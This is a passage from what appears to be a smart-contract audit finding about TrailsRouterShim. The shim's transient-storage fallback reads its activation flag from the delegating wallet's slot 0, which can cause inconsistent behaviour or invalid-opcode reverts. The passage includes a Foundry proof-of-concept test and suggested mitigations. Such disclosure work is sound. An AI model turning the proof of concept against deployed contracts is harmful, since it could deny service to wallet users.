3. `__activateTstore()` runs in the shim’s own storage context, sets `_tstoreSupport = true` in the shim’s slot 0 and returns.
4. Later, when a wallet delegatecalls into `handleSequenceDelegateCall`, `_setTstorishWithSstoreFallback` still reads `_tstoreSupport` from the wallet’s slot 0, not from the shim’s slot 0. Changing the shim’s storage had no effect on the branch taken under delegatecall.
5. Thus, the behaviour of `_setTstorish` (whether it uses `sstore` or `tstore`) is determined entirely by the delegating wallet’s slot-0 contents, not by the intended activation flag on the shim. Different wallets may see different behaviour at the same time, and the project cannot reliably configure sentinel semantics via `__activateTstore()`.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/TrailsRouterShim.sol";
import "src/libraries/TrailsSentinelLib.sol";

contract DummyRouter {
    // Always succeed and do nothing
    fallback() external payable {}
}

/// @dev Minimal wallet that will delegatecall into the shim.
contract MockWallet {
    // This variable is deliberately placed at slot 0.
    // We will toggle it to show that Tstorish reads caller slot 0 under delegatecall.
    uint256 public slot0;

    function executeShim(
        TrailsRouterShim shim,
        bytes32 opHash,
        bool nonZeroSlot0
    ) external payable {
        // Configure slot0 to simulate different wallet state
        if (nonZeroSlot0) {
            slot0 = 1; // non-zero
        } else {
            slot0 = 0;
        }

        // Data expected by handleSequenceDelegateCall: (bytes inner, uint256 callValue)
        bytes memory forward = abi.encode(bytes(""), uint256(0));

        (bool ok, bytes memory ret) = address(shim).delegatecall(
            abi.encodeWithSelector(
                TrailsRouterShim.handleSequenceDelegateCall.selector,
                opHash,
                uint256(0),
                uint256(0),
                uint256(0),
                uint256(0),
                forward
            )
        );

        // Bubble revert for observation in tests
        if (!ok) {
            assembly {
                revert(add(ret, 32), mload(ret))
            }
        }
    }

    function readSentinel(bytes32 opHash) external view returns (uint256 value) {
        uint256 slot = TrailsSentinelLib.successSlot(opHash);
        assembly {
            value := sload(slot)
        }
    }
}

contract TstorishShimCollisionTest is Test {
    DummyRouter internal router;
    TrailsRouterShim internal shim;
    MockWallet internal wallet;

    function setUp() public {
        router = new DummyRouter();
        shim = new TrailsRouterShim(address(router));
        wallet = new MockWallet();
    }

    /// @dev This test is written to run on a fork / chain where TSTORE was NOT supported
    /// at deployment time, so that `_setTstorish` is wired to the SSTORE fallback.
    /// It demonstrates that the fallback consults the caller's slot 0 rather than
    /// the shim's own `_tstoreSupport` flag, and that __activateTstore() on the shim
    /// cannot influence behaviour under delegatecall.
    function test_flagCollisionAndActivationNoEffect() public {
        bytes32 opHash1 = keccak256("op1");
        bytes32 opHash2 = keccak256("op2");

        // 1) First call via delegatecall with wallet.slot0 == 0
        // If the chain's EVM does NOT support TSTORE at runtime, the fallback
        // should take the `sstore` branch and succeed.
        wallet.executeShim(shim, opHash1, false);
        uint256 sentinel1 = wallet.readSentinel(opHash1);

        // If sentinel1 is non-zero, we know SSTORE was taken and the fallback path is active.
        // If sentinel1 is zero here, we're most likely on a dev environment where
        // TSTORE was already available at deployment, in which case the fallback
        // is never wired and this particular bug path does not manifest. In that
        // environment we skip the rest of the assertions to keep the test portable.
        if (sentinel1 == 0) {
            return;
        }

        assertEq(sentinel1, TrailsSentinelLib.SUCCESS_VALUE, "sentinel should be written when slot0 == 0");

        // 2) Call __activateTstore() on the shim contract directly.
        // This sets `_tstoreSupport` in the shim's own storage, NOT in the wallet.
        // Under delegatecall, the fallback will continue to read from the wallet's
        // slot 0, so this activation should have no effect.
        // We intentionally bypass the OnlyDirectCalls check by having this contract
        // be the direct sender (tx.origin == address(this) in Foundry tests).
        Tstorish(address(shim)).__activateTstore();

        // 3) Second call via delegatecall with wallet.slot0 == 1 (non-zero).
        // On a non-TSTORE chain, this would now take the `tstore` branch and revert
        // with invalid opcode; on a TSTORE-enabled chain it will write a transient
        // value instead of a persistent one. In either case, the branch decision was
        // driven by the wallet's slot0, not by the shim's own `_tstoreSupport`.
        // We expect a revert on non-TSTORE chains, so we wrap it in expectRevert.
        // NOTE: On TSTORE-enabled chains this call may succeed; in that case the
        // underlying issue is still present (behaviour depends on wallet slot0),
        // but it's harder to assert without directly checking transient storage.
        vm.expectRevert();
        wallet.executeShim(shim, opHash2, true);
    }
}


## Suggested Mitigation
Ensure that the mechanism deciding between `tstore/tload` and `sstore/sload` is never coupled to the delegating caller’s storage when the contract is intended to be used via `delegatecall`.

Concrete options for TrailsRouterShim:

1. **Remove the mutable flag for the shim**: Since TrailsRouterShim is designed as a stateless delegate-only extension, simplify its semantics by fixing the backend at deployment time.
   - If you require deterministic behaviour on both TSTORE and non-TSTORE chains, deploy a version of the shim that always uses `sstore/sload` (no transient storage) and does not inherit the runtime toggle parts of Tstorish.
   - Alternatively, deploy a shim variant compiled to always use `tstore/tload` only on chains where you know TSTORE is already active at deployment, and do not include the fallback/activation flag there.

2. **If you keep Tstorish, isolate the flag from caller storage**:
   - Move `_tstoreSupport` out of the default storage layout into a dedicated, namespaced slot (e.g. EIP-7201 style: `bytes32 slot = keccak256("org.sequence.trails.tstorish.flag");` and read/write it with inline assembly) so that its value is independent of slot 0 of any delegating wallet.
   - Ensure that all reads and writes of the TSTORE activation flag use that namespaced slot. The internal function pointers (`_setTstorish`, `_getTstorish`, `_clearTstorish`) can then safely consult this flag even under `delegatecall`.

3. **Constrain activation to a non-delegatecall context**:
   - Keep `__activateTstore()` but explicitly prohibit its execution via `delegatecall` (e.g. add a guard that reverts if `address(this) != _SELF` similar to `onlyDelegatecall`, or move activation to a separate, non-delegatecall utility contract).
   - Document that activation must be performed on the implementation contract itself (or via a dedicated configurator) and that the flag is global for that deployment.

Across all options, the key requirement is that the decision whether to use transient or regular storage must be a pure function of the shim’s own configuration and the chain’s opcode support, and must not depend on or read from arbitrary slots in the delegating wallet’s storage. This guarantees consistent sentinel semantics and avoids the invalid-opcode/DoS condition on non-TSTORE chains.



